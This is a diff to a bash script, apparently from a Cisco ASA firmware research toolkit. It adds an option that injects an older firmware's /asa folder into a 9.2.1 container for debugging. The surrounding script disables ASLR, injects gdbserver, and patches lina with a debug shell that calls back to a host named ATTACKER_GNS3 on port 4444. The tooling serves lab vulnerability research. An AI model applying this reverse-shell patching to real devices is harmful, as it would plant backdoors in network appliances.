@@ -63,7 +63,7 @@ usage()
     echo "      -G, --disable-gdb            Stop gdb from starting on boot"
     echo "      -a, --enable-aslr            Turn on ASLR"
     echo "      -A, --disable-aslr           Turn off ASLR"
-    echo "      -m, --inject-gdb             Inject gdbserver to run"
+    echo "      -m, --inject-gdb             Inject gdbserver for firmware lacking this file"
     echo "      -b, --debug-shell            Inject ssh-triggered debug shell"
     echo "      -B, --serial-shell           Configure a serial shell on ASA 2nd serial port"
     echo "      -H, --lina-hook              Inject hooks for monitor lina heap (requires -b)"
@@ -80,6 +80,7 @@ usage()
     echo "      -R, --repack-only            Repack an existing unpacked dir.  Requires --original-firmware"
     echo "      --replace-linamonitor <path> Use a simple name for the output .bin with just appended '-repacked'"
     echo "      --original-firmware <name>   Name of original firmware file. for use with --repack-only"
+    echo "      --bin-with-asa-to-inject <firmware_file>    Additional firmware bin file to take /asa folder from and inject into the one specified with -i"
     echo "      -v, --verbose                Display debug messages"
     echo "Examples:"
     echo " # Unpack and repack a firmware file, freeing space, enabling gdb, and injecting gdbserver bin. Output modifications to firmware_repacked dir"
@@ -282,10 +283,16 @@ unpack_bin()
     OUTFILE=$(basename "$FWFILE")
     EXTFILE=${FWFILE##*.}
 
+    if [ ! -z ${FWFILE_WITH_ASA_TO_INJECT} ]
+    then
+        OUTFILE_PREFIX=${FWFILE_WITH_ASA_TO_INJECT}-in-${OUTFILE%.*}
+    else
+        OUTFILE_PREFIX=${OUTFILE%.*}
+    fi
     OUTFILE_SUFFIX=
     if [[ "${SIMPLE_NAME}" != "YES" ]]; then
         # the more complex filename we could get is something like
-        # "asaXXX-smp-k8-noaslr-debugshell-hooked-gdbserver.bin"
+        # "asaXXX-smp-k8-in-asa921-smp-k8-noaslr-debugshell-hooked-gdbserver.bin"
         if [[ "${DISABLE_ASLR}" == "YES" ]]
         then
             OUTFILE_SUFFIX=$OUTFILE_SUFFIX-noaslr
@@ -312,7 +319,7 @@ unpack_bin()
         OUTFILE_SUFFIX=$OUTFILE_SUFFIX-gdbserver
     fi
     OUTFILE_SUFFIX=$OUTFILE_SUFFIX.${EXTFILE}
-    OUTFILE=${OUTDIR}/${OUTFILE%.*}${OUTFILE_SUFFIX}
+    OUTFILE=${OUTDIR}/${OUTFILE_PREFIX}${OUTFILE_SUFFIX}
 
     # get filename without extension
     BASEFWFILE=$(basename "$INFILE")
@@ -550,6 +557,63 @@ inject_gdb()
     fi
 }
 
+# inject_asa_folder()
+#
+# Arguments:
+#  None
+#
+# Required Globals:
+#  FWFILE_WITH_ASA_TO_INJECT - custom firmware to take /asa from
+#  FWFILE      - name of current firmware being worked on to inject new /asa (needs to be asa921-*.bin)
+#  FIRMWAREDIR - directory holding collection of firmware
+#
+# Notes:
+#  Expects $PWD to be an extracted rootfs directory
+#
+# Description:
+#  Injects an /asa/ folder from a separate firmware in FIRMWAREDIR into the
+#  firmware being worked on.
+#
+#  Firmware older than 921 have their gdb broken so we could not debug them :(
+#  Workaround is to use the asa921-k8.bin or asa921-smp-k8.bin as a container and inject the asa/
+#  folder from the older firmware in order to be able to debug it
+##
+inject_asa_folder()
+{
+    if [ ! -z ${FWFILE_WITH_ASA_TO_INJECT} ]
+    then
+        log "INJECT OTHER ASA FOLDER"
+        if [[ "$FWFILE" == *"asa921"* ]]; then
+            log "Using ${FWFILE} as container to inject /asa from ${FWFILE_WITH_ASA_TO_INJECT}"
+        else
+            log "ERROR: ${FWFILE} is not supported as container to inject /asa from ${FWFILE_WITH_ASA_TO_INJECT}. You need either asa921-k8.bin or asa921-smp-k8.bin"
+            exit 1
+        fi
+        log "Checking ${FWFILE_WITH_ASA_TO_INJECT}"
+        if [ ! -d "${FIRMWAREDIR}/_${FWFILE_WITH_ASA_TO_INJECT}.extracted" ]; then
+            log "Didn't find ${FIRMWAREDIR}/_${FWFILE_WITH_ASA_TO_INJECT}.extracted"
+            log "Need to binwalk ${FWFILE_WITH_ASA_TO_INJECT} to allow file stealing"
+            if [ ! -e "${FIRMWAREDIR}/${FWFILE_WITH_ASA_TO_INJECT}" ]; then
+                log "ERROR: Can't find ${FIRMWAREDIR}/${FWFILE_WITH_ASA_TO_INJECT} so can't binwalk it"
+                exit 1
+            fi
+            LASTDIR=$(pwd)
+            cd ${FIRMWAREDIR}
+            ${BINWALK} -e ${FWFILE_WITH_ASA_TO_INJECT}
+            cd ${LASTDIR}
+        fi
+        log "Using /asa from ${FWFILE_WITH_ASA_TO_INJECT}"
+        rm -Rf ./asa
+        CMD="cp -Rf ${FIRMWAREDIR}/_${FWFILE_WITH_ASA_TO_INJECT}.extracted/rootfs/asa ."
+        ${CMD}
+        if [ $? != 0 ];
+        then
+            log "ERROR: '${CMD}' failed"
+            exit 1
+        fi
+    fi
+}
+
 # replace_lina_monitor()
 #
 # Arguments:
@@ -585,13 +649,20 @@ inject_debugshell()
     # of patching lina_monitor to bypass boot verification of lina.
     if [[ "$DEBUGSHELL" == "YES" ]]
     then
+        FWFILE_WITH_ASA=${FWFILE}
+        if [ ! -z ${FWFILE_WITH_ASA_TO_INJECT} ]
+        then
+            FWFILE_WITH_ASA=${FWFILE_WITH_ASA_TO_INJECT}
+            log "debug shell: overriding firmware with ${FWFILE_WITH_ASA} to patch lina correctly"
+        fi
+
         ADDITIONAL_ARGS=""
         if [[ ! -z "${LINAHOOK}" ]]
         then
             ADDITIONAL_ARGS="--hook ${LINAHOOK}"
         fi
         CBPORT="4444"
-        if [[ "$FWFILE" == *"asav"* ]]
+        if [[ "$FWFILE_WITH_ASA" == *"asav"* ]]
         then
             log "debug shell: using 64-bit ASAv firmware"
             CBHOST=${ATTACKER_GNS3}
@@ -609,7 +680,7 @@ inject_debugshell()
         fi
         # NOTE: we pass as many arguments as possible to LINA_LINUXSHELL and it is up to that script to know
         #       if libc is used for malloc()/etc. and if lina_monitor needs to be patched.
-        CMD="${LINA_LINUXSHELL} -b ${FWFILE} -F ${PWD}/asa/bin/lina_monitor -O ${PWD}/asa/bin/lina_monitor -f ${PWD}/asa/bin/lina -o ${PWD}/asa/bin/lina -c $CBHOST -p $CBPORT -d ${ASADBG_DB} ${ADDITIONAL_ARGS} --libc-input ${LIBC} --libc-output ${LIBC}"
+        CMD="${LINA_LINUXSHELL} -b ${FWFILE_WITH_ASA} -F ${PWD}/asa/bin/lina_monitor -O ${PWD}/asa/bin/lina_monitor -f ${PWD}/asa/bin/lina -o ${PWD}/asa/bin/lina -c $CBHOST -p $CBPORT -d ${ASADBG_DB} ${ADDITIONAL_ARGS} --libc-input ${LIBC} --libc-output ${LIBC}"
 
         log "Using command: '${CMD}'"
         # XXX - fix fact that we use -b to specify the bin_name but it would not work if the name is not one of the original Cisco ones (such as asa924-k8.bin)
@@ -655,7 +726,7 @@ setup_serialshell()
         #log "Starting lina at boot"
         #sed -i 's/    echo "$CGEXEC \/asa\/bin\/lina_monitor.*"/    echo "\/asa\/scripts\/lina_start.sh"/' asa/scripts/rcS
         log "Not starting lina at boot"
-        sed -i 's/    echo "$CGEXEC \/asa\/bin\/lina_monitor.*"/    echo ""/' asa/scripts/rcS
+        sed -i 's/echo "$CGEXEC \/asa\/bin\/lina_monitor.*"/echo ""/' asa/scripts/rcS
 
         declare -a scripts_list=("lina_start.sh" "lina_debug.sh" "lin_a_kill.sh")
         for file in "${scripts_list[@]}"
@@ -777,6 +848,7 @@ modify_bin()
     OLDDIR=${PWD}
     cd ${1}
 
+    inject_asa_folder # early so all other modifications are done on the right /asa files
     disable_aslr
     enable_gdb
     disable_gdb
@@ -900,6 +972,7 @@ REPACK_ONLY="NO"
 ORIGINAL_FIRMWARE=
 REPLACE_LINAMONITORITOR=
 DEBUG=
+FWFILE_WITH_ASA_TO_INJECT=
 while [[ $# -gt 0 ]]
 do
     key="$1"
@@ -938,6 +1011,10 @@ do
             ;;
         -m|--inject-gdb)
             INJECT_GDB="YES"
+            ;;
+        --bin-with-asa-to-inject)
+            FWFILE_WITH_ASA_TO_INJECT="$2"
+            shift
             ;;
         -b|--debug-shell)
             DEBUGSHELL="YES"
